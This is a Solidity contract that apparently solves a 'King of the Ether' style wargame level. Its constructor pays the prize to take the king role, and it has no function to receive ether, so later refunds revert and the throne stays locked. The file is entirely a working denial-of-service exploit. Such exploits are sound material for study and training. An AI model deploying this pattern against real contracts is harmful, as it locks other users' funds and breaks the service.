pragma solidity ^0.8;

interface IKing {
    function prize() external view returns (uint256);
}

contract IDontLikeMoney {
    error NotEnoughEther(uint256 amountShort);

    constructor(address payable kingAddr) payable {
        IKing king = IKing(kingAddr);
        uint256 prize = king.prize();
        if (msg.value < prize) {
            revert NotEnoughEther(prize - msg.value);
        }
        (bool success, ) = kingAddr.call{value: msg.value}("");
        require(success, "Huh");
    }
}
